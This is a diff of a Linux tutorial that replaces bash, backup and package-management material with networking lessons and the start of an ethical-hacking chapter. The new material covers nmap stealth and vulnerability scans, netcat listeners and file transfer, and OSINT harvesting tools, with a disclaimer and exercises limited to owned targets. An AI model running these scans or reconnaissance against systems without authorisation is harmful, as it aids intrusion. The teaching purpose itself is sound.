-
-# Curl advanced usage
-curl -L -o file.zip http://example.com/redirect     # Follow redirects
-curl -u username:password ftp://ftp.example.com/file.txt  # FTP with auth
-curl -X POST -d "data" http://api.example.com/endpoint    # POST data
-```
+1.  Update your system's package list.
+2.  Search for a package named `neofetch`.
+3.  Install `neofetch`.
+4.  Run `neofetch`.
+5.  Remove `neofetch`.
 
 ---
 
-## File Management & Compression
+#### Shell Scripting
 
-### Archive & Compression
+Automate tasks by combining commands into scripts.
 
-**Tar (Tape Archive):**
+| Concept | Description | Example |
+|---|---|---|
+| **Shebang** | First line of a script | `#!/bin/bash` |
+| **Variables** | Store data | `name="World"` |
+| **Execution** | Run a script | `bash script.sh` or `./script.sh` (if executable) |
+
+**Deep Dive: Variables and Parameters**
+
+Variables are used to store data, and parameters are used to pass data to scripts.
+
+| Concept | Description |
+|---|---|
+| **Variables** | Store values that can be used later in the script. |
+| **Environment Variables** | Variables that are available system-wide and to all processes. |
+| **Positional Parameters** | `$1`, `$2`, ..., `$N`: The first, second, ..., Nth argument to a script or function. |
+| **Special Variables** | `$?`: Exit status of the last command. `$$`: Process ID of the current shell. `$#`: Number of arguments passed to the script. |
+
+**Exercises: Shell Scripting**
+
+1.  Create a script `welcome.sh` that prints "Welcome, [Your Name]!".
+2.  Make the script executable.
+3.  Run the script.
+
+---
+
+###  Windows Command Line Equivalents
+
+For those coming from a Windows background, here is a quick translation guide.
+
+| Linux Command | Windows `cmd` | Windows `PowerShell` | Description |
+|---|---|---|---|
+| `ls` | `dir` | `Get-ChildItem` (alias `ls`, `gci`) | List directory contents. |
+| `cd` | `cd` | `Set-Location` (alias `cd`, `sl`) | Change directory. |
+| `cp` | `copy` | `Copy-Item` (alias `cp`, `cpi`) | Copy files. |
+| `mv` | `move` / `rename` | `Move-Item` / `Rename-Item` | Move or rename files. |
+| `rm` | `del` / `erase` | `Remove-Item` (alias `rm`, `del`) | Remove files. |
+| `mkdir` | `mkdir` | `New-Item -ItemType Directory` | Create a directory. |
+| `pwd` | `cd` (with no args) | `Get-Location` (alias `pwd`, `gl`) | Print working directory. |
+| `ps` | `tasklist` | `Get-Process` (alias `ps`, `gps`) | List processes. |
+| `kill` | `taskkill` | `Stop-Process` (alias `kill`, `spps`) | Terminate a process. |
+| `ip addr` | `ipconfig` | `Get-NetIPAddress` | Show network configuration. |
+| `cat` | `type` | `Get-Content` (alias `cat`, `gc`) | Display file content. |
+| `grep` | `findstr` | `Select-String` | Search for text in files. |
+| `sudo` | (run as Admin) | `Start-Process -Verb RunAs` | Elevate privileges. |
+
+---
+
+## 🌐 Networking Mastery
+
+A deep understanding of networking is non-negotiable for any serious Linux user, administrator, or security professional. This section covers the foundational concepts, tools, and protocols.
+
+### Core Concepts: TCP/IP and the OSI Model
+
+Before touching the tools, you must understand the rules of the road.
+
+**The OSI Model (A Quick Look)**
+
+The Open Systems Interconnection (OSI) model is a conceptual framework that standardizes the functions of a telecommunication or computing system into seven abstract layers.
+
+| Layer | Name | Purpose | Common Protocols |
+|---|---|---|---|
+| 7 | Application | Human-computer interaction | HTTP, FTP, SMTP, DNS, SSH |
+| 6 | Presentation | Data formatting, encryption | SSL/TLS, JPEG, MPEG |
+| 5 | Session | Manages connections | NetBIOS, SAP |
+| 4 | Transport | End-to-end connections, reliability | **TCP**, **UDP** |
+| 3 | Network | Path determination, IP addressing | **IP**, ICMP, OSPF |
+| 2 | Data Link | Physical addressing (MAC) | Ethernet, Wi-Fi, ARP |
+| 1 | Physical | Hardware, electrical signals | Cables, Hubs |
+
+**TCP vs. UDP**
+
+The two most important protocols at the Transport Layer (Layer 4) are TCP and UDP.
+
+| Feature | TCP (Transmission Control Protocol) | UDP (User Datagram Protocol) |
+|---|---|---|
+| **Connection** | Connection-oriented (establishes a session) | Connectionless (fire and forget) |
+| **Reliability** | High (guarantees delivery, order, and integrity) | Low (no guarantees) |
+| **Header Size** | 20 bytes | 8 bytes |
+| **Speed** | Slower (due to overhead) | Faster (less overhead) |
+| **Use Cases** | Web browsing (HTTP), email (SMTP), file transfer (FTP) | Streaming video/audio, online gaming, DNS |
+
+**Ports, Protocols, and Sockets**
+
+*   **Port:** A numerical identifier (0-65535) on a host that directs traffic to a specific service or application.
+*   **Protocol:** A set of rules governing data exchange (e.g., TCP, UDP, HTTP).
+*   **Socket:** The combination of an IP address and a port number (`<IP_Address>:<Port>`), forming a unique endpoint for communication.
+
+### Essential Networking Tools
+
+#### Network Diagnostics and Analysis
+
+These tools are your first line of defense for troubleshooting and exploration.
+
 | Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `tar -c` | Create archive | `tar -czf archive.tar.gz files/` | `-z` for gzip compression |
-| `tar -x` | Extract archive | `tar -xzf archive.tar.gz` | Extract with decompression |
-| `tar -t` | List contents | `tar -tzf archive.tar.gz` | View without extracting |
-| `tar -r` | Append to archive | `tar -rf archive.tar newfile` | Add files to existing archive |
+|---|---|---|---|
+| `ping` | Test basic connectivity | `ping -c 4 8.8.8.8` | Sends ICMP packets. `-c` specifies the count. |
+| `traceroute` | Trace the network path to a host | `traceroute google.com` | Shows every router (hop) your packets travel through. |
+| `mtr` | **M**y **Tr**aceroute | `mtr google.com` | Combines `ping` and `traceroute` into a real-time diagnostic tool. |
+| `dig` | **D**omain **I**nformation **G**roper | `dig google.com MX` | A powerful tool for DNS queries. Far more detailed than `nslookup`. |
+| `nslookup` | **N**ame **S**erver **Lookup** | `nslookup github.com` | A simpler tool for DNS queries. |
+| `ss` | **S**ocket **S**tatistics | `ss -tulnpa` | The modern tool to inspect sockets. Replaces `netstat`. |
 
-**Compression Tools:**
-| Tool | Command | Compression | Speed | Notes |
-|------|---------|-------------|-------|-------|
-| gzip | `gzip file.txt` | Good | Fast | Creates .gz files |
-| bzip2 | `bzip2 file.txt` | Better | Slower | Creates .bz2 files |
-| xz | `xz file.txt` | Best | Slowest | Creates .xz files |
-| zip | `zip archive.zip files/*` | Good | Fast | Cross-platform |
-| 7z | `7z a archive.7z files/` | Excellent | Medium | Best compression |
+**Deep Dive: `ss` Command Options**
 
-**Archive Examples:**
-```bash
-# Create archives
-tar -czf backup.tar.gz /home/user/documents/      # Gzip compressed
-tar -cjf backup.tar.bz2 /home/user/documents/     # Bzip2 compressed
-tar -cJf backup.tar.xz /home/user/documents/      # XZ compressed
+| Option | Meaning |
+|---|---|
+| `-t` | Show **T**CP sockets. |
+| `-u` | Show **U**DP sockets. |
+| `-l` | Show **l**istening sockets. |
+| `-n` | Show **n**umerical addresses (don't resolve hostnames). |
+| `-p` | Show the **p**rocess using the socket. |
+| `-a` | Show **a**ll sockets (listening and established). |
 
-# Extract archives
-tar -xzf backup.tar.gz -C /restore/location/      # Extract to specific directory
-tar -xjf backup.tar.bz2 --strip-components=1      # Remove leading directory
-unzip archive.zip -d /destination/                # Extract ZIP file
+**Exercises: Diagnostics**
 
-# Archive with exclusions
-tar -czf backup.tar.gz --exclude="*.tmp" --exclude="*.log" /home/user/
-
-# Split large archives
-tar -czf - /large/directory/ | split -b 1G - backup.tar.gz.  # Split into 1GB parts
-cat backup.tar.gz.* | tar -xzf -                  # Reconstruct and extract
-
-# Encrypted archives
-tar -czf - /secret/files/ | gpg -c > backup.tar.gz.gpg     # Encrypt with GPG
-gpg -d backup.tar.gz.gpg | tar -xzf -             # Decrypt and extract
-```
-
-### Mounting & Filesystems
-
-**Mount Management:**
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `mount` | Mount filesystem | `mount /dev/sdb1 /mnt/usb` | Attach filesystem |
-| `umount` | Unmount filesystem | `umount /mnt/usb` | Detach filesystem |
-| `lsblk` | List block devices | `lsblk -f` | Shows filesystems |
-| `fdisk` | Disk partitioning | `fdisk -l` | List partitions |
-| `mkfs` | Create filesystem | `mkfs.ext4 /dev/sdb1` | Format partition |
-| `fsck` | Check filesystem | `fsck /dev/sdb1` | Repair filesystem |
-
-**Filesystem Operations:**
-```bash
-# View mounted filesystems
-mount | grep -E "^/dev"               # Show mounted devices
-df -hT                                # Filesystem types and usage
-findmnt                               # Tree view of mounts
-
-# Mount operations
-sudo mount -t ext4 /dev/sdb1 /mnt/external     # Mount with filesystem type
-sudo mount -o ro /dev/sdb1 /mnt/readonly       # Read-only mount
-sudo mount -o loop image.iso /mnt/cdrom        # Mount ISO image
-
-# Permanent mounts (/etc/fstab)
-# Device        Mount Point    FS Type    Options           Dump Pass
-/dev/sdb1      /mnt/storage   ext4       defaults,noatime  0    2
-UUID=abc123... /home          ext4       defaults          0    2
-
-# USB/External device handling
-udisksctl mount -b /dev/sdb1           # User-space mount
-udisksctl unmount -b /dev/sdb1         # User-space unmount
-```
-
-**Filesystem Creation and Repair:**
-```bash
-# Create filesystems
-sudo mkfs.ext4 -L "Storage" /dev/sdb1  # Create ext4 with label
-sudo mkfs.xfs -f /dev/sdb1             # Create XFS filesystem
-sudo mkfs.ntfs -Q /dev/sdb1            # Quick NTFS format
-
-# Filesystem checking and repair
-sudo fsck -f /dev/sdb1                 # Force check
-sudo fsck.ext4 -p /dev/sdb1            # Automatic repair
-sudo xfs_repair /dev/sdb1              # XFS repair
-
-# Filesystem information
-sudo tune2fs -l /dev/sdb1              # Ext filesystem info
-sudo xfs_info /dev/sdb1                # XFS filesystem info
-```
-
-### Backup Strategies
-
-**Backup Methods:**
-
-1. **Full Backup**: Complete copy of all data
-2. **Incremental Backup**: Only changes since last backup
-3. **Differential Backup**: Changes since last full backup
-4. **Snapshot Backup**: Point-in-time filesystem snapshot
-
-**Backup Tools:**
-```bash
-# Rsync-based backups
-rsync -avH --delete /home/ /backup/home/           # Mirror backup
-rsync -avH --link-dest=/backup/2024-01-01/ /home/ /backup/2024-01-02/  # Hardlink backup
-
-# DD for disk cloning
-sudo dd if=/dev/sda of=/backup/disk.img bs=1M status=progress  # Clone entire disk
-sudo dd if=/dev/sda1 of=/backup/partition.img bs=1M           # Clone partition
-
-# System backup script example
-#!/bin/bash
-DATE=$(date +%Y-%m-%d)
-BACKUP_DIR="/backup/$DATE"
-SOURCE_DIRS="/home /etc /var/log"
-
-mkdir -p "$BACKUP_DIR"
-for dir in $SOURCE_DIRS; do
-    rsync -avH "$dir/" "$BACKUP_DIR$(basename $dir)/"
-done
-tar -czf "$BACKUP_DIR.tar.gz" "$BACKUP_DIR"
-rm -rf "$BACKUP_DIR"
-```
+1.  Verify you have a connection to the internet.
+2.  Trace the path to `mit.edu`. How many hops does it take?
+3.  Find the mail exchange (MX) records for `protonmail.com`.
+4.  List all listening TCP sockets on your machine and the processes using them.
 
 ---
 
-## Shell Scripting
+#### The Network Swiss Army Knives
 
-### Bash Fundamentals
+These tools are incredibly versatile and are used for everything from simple tests to complex security tasks.
 
-**Script Structure:**
-```bash
-#!/bin/bash
-# Shebang line - specifies interpreter
+| Tool | Description | Key Use Cases |
+|---|---|---|
+| `nmap` | **N**etwork **Map**per | Port scanning, service version detection, OS detection, vulnerability scanning. |
+| `netcat` (`nc`) | The "TCP/IP Swiss army knife" | Port scanning, banner grabbing, file transfer, creating backdoors. |
+| `tcpdump` | Command-line packet analyzer | Capturing and analyzing raw network traffic from the terminal. |
+| `Wireshark` | GUI packet analyzer | Deep, graphical inspection of network protocols and packet contents. |
 
-# Script metadata
-# Description: Example script demonstrating bash basics
-# Author: Your Name
-# Date: 2024-01-01
-# Version: 1.0
+**Deep Dive: `nmap` Scans**
 
-set -euo pipefail  # Exit on error, undefined vars, pipe failures
+`nmap` is the world's most famous port scanner, essential for reconnaissance.
 
-# Your script content here
-echo "Hello, World!"
-```
+| Command | Description |
+|---|---|
+| `nmap <target>` | A basic scan of the top 1000 TCP ports. |
+| `nmap -sS <target>` | **S**YN **S**can (Stealth Scan): The default for privileged users. Fast and less likely to be logged. |
+| `nmap -sT <target>` | **T**CP **C**onnect Scan: Completes the three-way handshake. Slower and noisier. |
+| `nmap -sU <target>` | **U**DP Scan: Scans for open UDP ports. Much slower than TCP scans. |
+| `nmap -p- <target>` | Scan all 65,535 ports. |
+| `nmap -p 80,443 <target>` | Scan specific ports. |
+| `nmap -sV <target>` | **S**ervice **V**ersion detection: Tries to determine the software and version running on open ports. |
+| `nmap -O <target>` | **O**S detection: Attempts to identify the operating system of the target. |
+| `nmap -A <target>` | **A**ggressive Scan: Enables OS detection (`-O`), version detection (`-sV`), script scanning (`-sC`), and traceroute. |
+| `nmap --script vuln <target>` | Runs scripts from the `vuln` category to check for known vulnerabilities. |
 
-**Basic Syntax:**
-```bash
-# Comments
-# This is a comment
-: '
-This is a
-multi-line comment
-'
+**Deep Dive: `netcat` (`nc`)**
 
-# Variables
-name="John"                    # String variable
-age=30                         # Integer variable
-readonly PI=3.14159           # Read-only variable
-unset name                    # Remove variable
+`netcat` can create almost any kind of connection you need.
 
-# Command substitution
-current_date=$(date)          # Modern syntax
-current_date=`date`           # Legacy syntax (avoid)
+| Command | Description |
+|---|---|
+| `nc -zv <target> 1-1024` | **Z**ero-I/O **v**erbose scan: A simple way to check for open ports in a range. |
+| `nc -l -p <port>` | **L**isten on a specific port, creating a simple server. |
+| `echo "GET / HTTP/1.0\r\n\r\n" | nc <target> 80` | **Banner Grabbing:** Connect to a web server and grab the HTTP header. |
+| `nc -l -p 1234 > received_file` | On the receiving machine, listen and redirect output to a file. |
+| `nc <receiver_ip> 1234 < file_to_send` | On the sending machine, connect and send a file. |
 
-# Arrays
-fruits=("apple" "banana" "orange")
-echo ${fruits[0]}             # First element
-echo ${fruits[@]}             # All elements
-echo ${#fruits[@]}            # Array length
-```
+**Exercises: Advanced Tools**
 
-### Variables & Parameters
-
-**Variable Types and Manipulation:**
-```bash
-# String operations
-string="Hello World"
-echo ${#string}               # Length
-echo ${string:0:5}            # Substring (Hello)
-echo ${string/World/Bash}     # Replace first occurrence
-echo ${string//l/L}           # Replace all occurrences
-echo ${string^^}              # Convert to uppercase
-echo ${string,,}              # Convert to lowercase
-
-# Parameter expansion
-file="/path/to/file.txt"
-echo ${file%.*}               # Remove extension: /path/to/file
-echo ${file##*/}              # Get filename: file.txt
-echo ${file%/*}               # Get directory: /path/to
-
-# Default values
-echo ${VAR:-default}          # Use default if VAR is unset
-echo ${VAR:=default}          # Set VAR to default if unset
-echo ${VAR:?"VAR is required"}  # Error if VAR is unset
-
-# Special parameters
-echo $0                       # Script name
-echo $1 $2 $3                # First three arguments
-echo $#                      # Number of arguments
-echo $@                      # All arguments as separate words
-echo $*                      # All arguments as single word
-echo $?                      # Exit status of last command
-echo $$                      # Process ID of script
-```
-
-**Environment Variables:**
-```bash
-# Important environment variables
-echo $HOME                    # User home directory
-echo $PATH                    # Executable search path
-echo $PWD                     # Current working directory
-echo $USER                    # Current username
-echo $SHELL                   # Current shell
-
-# Setting environment variables
-export MY_VAR="value"         # Available to child processes
-MY_VAR="value"               # Local to current shell
-
-# Reading from files
-while IFS= read -r line; do
-    echo "Line: $line"
-done < file.txt
-```
-
-### Control Structures
-
-**Conditional Statements:**
-```bash
-# If statements
-if [ "$age" -gt 18 ]; then
-    echo "Adult"
-elif [ "$age" -eq 18 ]; then
-    echo "Just turned adult"
-else
-    echo "Minor"
-fi
-
-# Test operators
-[ -f file.txt ]               # File exists and is regular file
-[ -d directory ]              # Directory exists
-[ -r file.txt ]               # File is readable
-[ -w file.txt ]               # File is writable
-[ -x script.sh ]              # File is executable
-[ -s file.txt ]               # File exists and is not empty
-
-[ "$a" = "$b" ]               # String equality
-[ "$a" != "$b" ]              # String inequality
-[ -z "$string" ]              # String is empty
-[ -n "$string" ]              # String is not empty
-
-[ "$num1" -eq "$num2" ]       # Numeric equality
-[ "$num1" -ne "$num2" ]       # Numeric inequality
-[ "$num1" -lt "$num2" ]       # Less than
-[ "$num1" -le "$num2" ]       # Less than or equal
-[ "$num1" -gt "$num2" ]       # Greater than
-[ "$num1" -ge "$num2" ]       # Greater than or equal
-
-# Modern test syntax
-if [[ "$string" =~ ^[0-9]+$ ]]; then
-    echo "String contains only digits"
-fi
-
-# Case statements
-case "$input" in
-    start|begin)
-        echo "Starting..."
-        ;;
-    stop|end)
-        echo "Stopping..."
-        ;;
-    restart)
-        echo "Restarting..."
-        ;;
-    *)
-        echo "Unknown command: $input"
-        ;;
-esac
-```
-
-**Loops:**
-```bash
-# For loops
-for i in {1..10}; do
-    echo "Number: $i"
-done
-
-for file in *.txt; do
-    echo "Processing: $file"
-done
-
-for ((i=1; i<=10; i++)); do
-    echo "Counter: $i"
-done
-
-# While loops
-counter=1
-while [ $counter -le 10 ]; do
-    echo "Counter: $counter"
-    ((counter++))
-done
-
-# Until loops
-counter=1
-until [ $counter -gt 10 ]; do
-    echo "Counter: $counter"
-    ((counter++))
-done
-
-# Reading file line by line
-while IFS= read -r line; do
-    echo "Processing: $line"
-done < input.txt
-```
-
-### Functions & Libraries
-
-**Function Definition:**
-```bash
-# Basic function
-greet() {
-    echo "Hello, $1!"
-}
-
-# Function with local variables
-calculate_area() {
-    local length=$1
-    local width=$2
-    local area=$((length * width))
-    echo $area
-}
-
-# Function with return value
-is_valid_email() {
-    local email=$1
-    if [[ "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
-        return 0  # Success
-    else
-        return 1  # Failure
-    fi
-}
-
-# Using functions
-greet "World"
-area=$(calculate_area 10 5)
-echo "Area: $area"
-
-if is_valid_email "user@example.com"; then
-    echo "Valid email"
-else
-    echo "Invalid email"
-fi
-```
-
-**Script Libraries:**
-```bash
-# logger.sh - Logging library
-log_info() {
-    echo "[$(date +'%Y-%m-%d %H:%M:%S')] INFO: $*"
-}
-
-log_error() {
-    echo "[$(date +'%Y-%m-%d %H:%M:%S')] ERROR: $*" >&2
-}
-
-log_debug() {
-    if [ "$DEBUG" = "1" ]; then
-        echo "[$(date +'%Y-%m-%d %H:%M:%S')] DEBUG: $*"
-    fi
-}
-
-# config.sh - Configuration management
-load_config() {
-    local config_file=${1:-config.conf}
-    if [ -f "$config_file" ]; then
-        source "$config_file"
-        log_info "Configuration loaded from $config_file"
-    else
-        log_error "Configuration file not found: $config_file"
-        return 1
-    fi
-}
-
-# main.sh - Main script
-#!/bin/bash
-source ./logger.sh
-source ./config.sh
-
-load_config
-log_info "Script started"
-```
-
-### Cron Jobs & Automation
-
-**Cron Syntax:**
-```
-# Minute Hour Day Month DayOfWeek Command
-# (0-59) (0-23) (1-31) (1-12) (0-7, 0=Sunday)
-
-# Examples:
-0 2 * * *           # Daily at 2 AM
-*/15 * * * *        # Every 15 minutes
-0 0 1 * *           # First day of every month
-0 9-17 * * 1-5      # Every hour from 9 AM to 5 PM, Monday to Friday
-0 0 * * 0           # Every Sunday at midnight
-```
-
-**Cron Management:**
-```bash
-# View cron jobs
-crontab -l                    # List current user's cron jobs
-sudo crontab -l -u username   # List another user's cron jobs
-
-# Edit cron jobs
-crontab -e                    # Edit current user's cron jobs
-sudo crontab -e -u username   # Edit another user's cron jobs
-
-# Remove all cron jobs
-crontab -r                    # Remove all cron jobs for current user
-
-# System-wide cron
-/etc/crontab                  # System cron table
-/etc/cron.d/                  # Additional cron files
-/etc/cron.daily/              # Daily scripts
-/etc/cron.weekly/             # Weekly scripts
-/etc/cron.monthly/            # Monthly scripts
-```
-
-**Automation Examples:**
-```bash
-# Backup script (backup.sh)
-#!/bin/bash
-BACKUP_DIR="/backup/$(date +%Y-%m-%d)"
-SOURCE_DIRS="/home /etc"
-
-mkdir -p "$BACKUP_DIR"
-for dir in $SOURCE_DIRS; do
-    tar -czf "$BACKUP_DIR/$(basename $dir).tar.gz" "$dir"
-done
-
-# System monitoring script (monitor.sh)
-#!/bin/bash
-THRESHOLD=80
-DISK_USAGE=$(df / | awk 'NR==2 {print $5}' | sed 's/%//')
-
-if [ "$DISK_USAGE" -gt "$THRESHOLD" ]; then
-    echo "Disk usage is ${DISK_USAGE}% - exceeds threshold" | mail -s "Disk Alert" admin@example.com
-fi
-
-# Log rotation script (rotate_logs.sh)
-#!/bin/bash
-LOG_DIR="/var/log/myapp"
-DAYS_TO_KEEP=30
-
-find "$LOG_DIR" -name "*.log" -type f -mtime +$DAYS_TO_KEEP -delete
-find "$LOG_DIR" -name "*.log" -type f -exec gzip {} \;
-```
+1.  **(Use with caution and only on targets you own!)** Scan `scanme.nmap.org` to find its open ports and the services running on them.
+2.  Use `netcat` to grab the HTTP banner from `example.com` on port 80.
+3.  Set up a `netcat` listener on port 4444 on your machine. In another terminal, connect to it. Type a message and see it appear on the listener.
+4.  Use `tcpdump` to capture ICMP traffic while you `ping 8.8.8.8`. (Command: `sudo tcpdump -i <interface> icmp`).
 
 ---
 
-## Package & Software Management
+### Common Protocols and Their Ports
 
-### Debian/Ubuntu (APT)
+Memorizing these is a rite of passage.
 
-**APT Package Management:**
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `apt update` | Update package lists | `sudo apt update` | Always run before upgrade |
-| `apt upgrade` | Upgrade packages | `sudo apt upgrade` | Upgrades installed packages |
-| `apt install` | Install packages | `sudo apt install nginx` | Install new packages |
-| `apt remove` | Remove packages | `sudo apt remove nginx` | Keep configuration files |
-| `apt purge` | Remove completely | `sudo apt purge nginx` | Remove package and config |
-| `apt search` | Search packages | `apt search web server` | Find packages by keyword |
-| `apt show` | Package information | `apt show nginx` | Detailed package info |
-| `apt list` | List packages | `apt list --installed` | Show installed packages |
-
-**Advanced APT Usage:**
-```bash
-# Package information
-apt-cache policy nginx        # Show available versions
-apt-cache depends nginx       # Show dependencies
-apt-cache rdepends nginx      # Show reverse dependencies
-
-# Hold packages (prevent upgrades)
-sudo apt-mark hold nginx      # Hold package at current version
-sudo apt-mark unhold nginx    # Remove hold
-apt-mark showhold             # Show held packages
-
-# Source packages
-apt source nginx              # Download source code
-sudo apt build-dep nginx      # Install build dependencies
-
-# Repository management
-sudo add-apt-repository ppa:nginx/stable    # Add PPA
-sudo add-apt-repository --remove ppa:nginx/stable  # Remove PPA
-
-# Alternative sources.list management
-/etc/apt/sources.list         # Main repository configuration
-/etc/apt/sources.list.d/      # Additional repository files
-
-# Package priorities and pinning
-/etc/apt/preferences.d/       # Package pinning configuration
-```
-
-### RHEL/CentOS (YUM/DNF)
-
-**YUM/DNF Package Management:**
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `dnf update` | Update packages | `sudo dnf update` | DNF is newer than YUM |
-| `dnf install` | Install packages | `sudo dnf install nginx` | Install new packages |
-| `dnf remove` | Remove packages | `sudo dnf remove nginx` | Uninstall packages |
-| `dnf search` | Search packages | `dnf search web server` | Find packages |
-| `dnf info` | Package information | `dnf info nginx` | Detailed package info |
-| `dnf list` | List packages | `dnf list installed` | Show installed packages |
-| `dnf history` | Transaction history | `dnf history` | Show package operations |
-
-**Advanced DNF Usage:**
-```bash
-# Repository management
-sudo dnf config-manager --add-repo https://example.com/repo  # Add repository
-sudo dnf config-manager --disable repo-name     # Disable repository
-sudo dnf config-manager --enable repo-name      # Enable repository
-
-# Package groups
-dnf grouplist                 # List available groups
-sudo dnf groupinstall "Development Tools"       # Install package group
-sudo dnf groupremove "Development Tools"        # Remove package group
-
-# Module streams (RHEL 8+)
-dnf module list               # List available modules
-sudo dnf module install nginx:1.18             # Install specific module stream
-sudo dnf module reset nginx  # Reset module stream
-
-# Clean up
-sudo dnf clean all           # Clean package cache
-sudo dnf autoremove          # Remove orphaned packages
-```
-
-**RPM Package Management:**
-```bash
-# RPM queries
-rpm -qa                       # List all installed packages
-rpm -qi package_name          # Package information
-rpm -ql package_name          # List package files
-rpm -qf /path/to/file         # Find package owning file
-
-# RPM installation
-sudo rpm -ivh package.rpm     # Install package
-sudo rpm -Uvh package.rpm     # Upgrade package
-sudo rpm -e package_name      # Remove package
-
-# RPM verification
-rpm -Va                       # Verify all packages
-rpm -V package_name           # Verify specific package
-```
-
-### Universal Packages
-
-**Snap Packages:**
-```bash
-# Snap management
-sudo snap install package_name           # Install snap
-sudo snap remove package_name            # Remove snap
-snap list                                # List installed snaps
-snap find keyword                        # Search for snaps
-snap info package_name                   # Package information
-
-# Snap channels
-sudo snap install package_name --channel=beta    # Install from beta channel
-sudo snap refresh package_name --channel=stable  # Switch to stable channel
-
-# Snap permissions
-snap connections                         # Show interface connections
-sudo snap connect package_name:interface # Connect interface
-sudo snap disconnect package_name:interface # Disconnect interface
-```
-
-**Flatpak Packages:**
-```bash
-# Flatpak management
-flatpak install flathub org.package.Name        # Install from Flathub
-flatpak uninstall org.package.Name              # Remove application
-flatpak list                                    # List installed applications
-flatpak search keyword                          # Search applications
-
-# Repository management
-flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo
-flatpak remote-list                             # List repositories
-flatpak update                                  # Update all applications
-
-# Runtime management
-flatpak list --runtime                          # List installed runtimes
-flatpak uninstall --unused                      # Remove unused runtimes
-```
-
-**AppImage:**
-```bash
-# AppImage usage
-chmod +x application.AppImage            # Make executable
-./application.AppImage                   # Run application
-
-# AppImage integration
-# Install AppImageLauncher for desktop integration
-sudo apt install appimagelauncher       # Ubuntu/Debian
-```
-
-### Source Compilation
-
-**Building from Source:**
-```bash
-# Typical build process
-./configure --prefix=/usr/local          # Configure build
-make                                     # Compile source code
-sudo make install                        # Install compiled program
-sudo make uninstall                      # Uninstall (if supported)
-
-# Alternative build systems
-cmake .                                  # CMake configuration
-make                                     # Build with make
-
-meson build                              # Meson configuration
-ninja -C build                           # Build with ninja
-
-# Build dependencies (Debian/Ubuntu)
-sudo apt build-dep package_name          # Install build dependencies
-sudo apt install build-essential         # Essential build tools
-
-# Build dependencies (RHEL/CentOS)
-sudo dnf groupinstall "Development Tools"       # Development tools
-sudo dnf builddep package_name           # Install build dependencies
-```
+| Port | Protocol | Full Name | Purpose |
+|---|---|---|---|
+| 20/21 | FTP | File Transfer Protocol | Transferring files (20 for data, 21 for control). Largely insecure. |
+| 22 | SSH | Secure Shell | Secure remote command-line access and file transfer (via `scp`/`sftp`). |
+| 23 | Telnet | Telecommunication Network | Insecure remote command-line access. **Avoid.** |
+| 25 | SMTP | Simple Mail Transfer Protocol | Sending email. |
+| 53 | DNS | Domain Name System | Translating domain names to IP addresses. |
+| 80 | HTTP | HyperText Transfer Protocol | Standard protocol for web browsing. Unencrypted. |
+| 110 | POP3 | Post Office Protocol v3 | Receiving email. |
+| 143 | IMAP | Internet Message Access Protocol | Receiving email; more modern than POP3. |
+| 443 | HTTPS | HTTP Secure | Secure (encrypted) web browsing via TLS/SSL. |
+| 445 | SMB | Server Message Block | File sharing, printing. Common in Windows networks. |
+| 3306 | MySQL | - | Default port for the MySQL database system. |
+| 3389 | RDP | Remote Desktop Protocol | Graphical remote access, primarily for Windows. |
 
 ---
 
-## System Services
+## 🔒 Offensive Security (Ethical Hacking)
 
-### Systemd Management
+**⚠️ ETHICAL DISCLAIMER:** The techniques in this section are for educational purposes and authorized testing only. Always obtain explicit written permission before testing any system you don't own. Unauthorized access is illegal and unethical.
 
-**Service Control:**
-| Command | Description | Example | Notes |
-|---------|-------------|---------|-------|
-| `systemctl start` | Start service | `sudo systemctl start nginx` | Start immediately |
-| `systemctl stop` | Stop service | `sudo systemctl stop nginx` | Stop immediately |
-| `systemctl restart` | Restart service | `sudo systemctl restart nginx` | Stop then start |
-| `systemctl reload` | Reload config | `sudo systemctl reload nginx` | Reload without restart |
-| `systemctl status` | Service status | `systemctl status nginx` | Show detailed status |
-| `systemctl enable` | Enable at boot | `sudo systemctl enable nginx` | Start automatically |
-| `systemctl disable` | Disable at boot | `sudo systemctl disable nginx` | Don't start at boot |
-| `systemctl is-active` | Check if running | `systemctl is-active nginx` | Returns active/inactive |
-| `systemctl is-enabled` | Check if enabled | `systemctl is-enabled nginx` | Returns enabled/disabled |
+### The Hacker Methodology
 
-**System Control:**
-```bash
-# System state management
-sudo systemctl reboot            # Restart system
-sudo systemctl poweroff          # Shutdown system
-sudo systemctl suspend           # Suspend system
-sudo systemctl hibernate        # Hibernate system
+Professional penetration testing follows a structured approach:
 
-# Service discovery
-systemctl list-units            # List all units
-systemctl list-units --type=service    # List only services
-systemctl list-units --state=failed    # List failed units
-systemctl list-unit-files       # List all unit files
+1. **Reconnaissance** - Information gathering
+2. **Scanning & Enumeration** - Finding vulnerabilities
+3. **Exploitation** - Gaining access
+4. **Post-Exploitation** - Maintaining access and pivoting
+5. **Reporting** - Documenting findings and remediation
 
-# Service dependencies
-systemctl list-dependencies nginx      # Show service dependencies
-systemctl list-dependencies --reverse nginx  # Show what depends on service
-```
+### Reconnaissance & Information Gathering
 
-### Service Configuration
+The first phase involves gathering as much information as possible about the target without directly interacting with their systems.
 
-**Systemd Unit File Structure:**
-```ini
-# /etc/systemd/system/myapp.service
-[Unit]
-Description=My Application
-Documentation=https://example.com/docs
-After=network.target
-Wants=network-online.target
-Requires=postgresql.service
+#### OSINT (Open Source Intelligence)
 
-[Service]
-Type=simple
-User=myapp
-Group=myapp
-WorkingDirectory=/opt/myapp
-ExecStart=/opt/myapp/bin/myapp --config /etc/myapp/config.yaml
-ExecReload=/bin/kill -HUP $MAINPID
-Restart=always
-RestartSec=5
-StandardOutput=journal
-StandardError=journal
+| Tool/Technique | Purpose | Example Command | Notes |
+|---|---|---|---|
+| `whois` | Domain registration info | `whois example.com` | Owner details, registration dates, nameservers |
+| `dig` | DNS reconnaissance | `dig example.com ANY` | DNS records, subdomains |
+| `theHarvester` | Email/subdomain harvesting | `theHarvester -d example.com -b google` | Collects emails, hosts from search engines |
+| `recon-ng` | Reconnaissance framework | Interactive framework | Modular OSINT framework |
+| `Maltego` | Visual intelligence | GUI application | Link analysis and data mining |
+| `Shodan` | Internet device search | Web interface/API | "Google for IoT devices" |
 
-[Install]
-WantedBy=multi-user.target
-```
